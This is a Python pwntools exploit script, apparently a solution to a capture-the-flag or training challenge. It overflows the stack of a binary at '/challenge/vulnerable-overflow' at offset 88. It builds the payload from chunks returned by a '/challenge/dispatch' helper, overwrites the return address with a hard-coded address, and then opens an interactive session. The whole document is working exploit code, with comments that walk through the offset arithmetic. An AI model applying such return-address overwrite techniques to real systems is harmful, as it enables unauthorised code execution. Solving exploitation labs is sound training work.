#!/usr/bin/python3

from pwn import *


context.log_level = 'error' 
elf = context.binary = ELF("/challenge/vulnerable-overflow")
offset = 88

def encrypted_data(data):
    io = process("/challenge/dispatch")
    io.send(data)
    data = io.recvall()
    print(len(data))
    io.close()
    return data

# offset is 88 so what ever i put after 88 byte goes to return address

data = encrypted_data(b"a"*16) # this return 48 byte 16 byte goes to header and 32 byte goes to stack so 88 - 32 = 56
data1 = encrypted_data(b"a"*8) # this retun 32 byte and goes to stack so 56 - 32 = 24
data2 = encrypted_data(b"\x00"*8+b"\xf7\x18\x40\x00\x00\x00\x00\x00") # this return 48 byte and where first 16 byte is header and length next 8 byte is null nyte so 24 -16 -8 = 0
# thus after that null byte whatever 8 byte we give it goes in return address

payload = data + data1 + data2

p = process()
p.send(payload)

p.interactive()
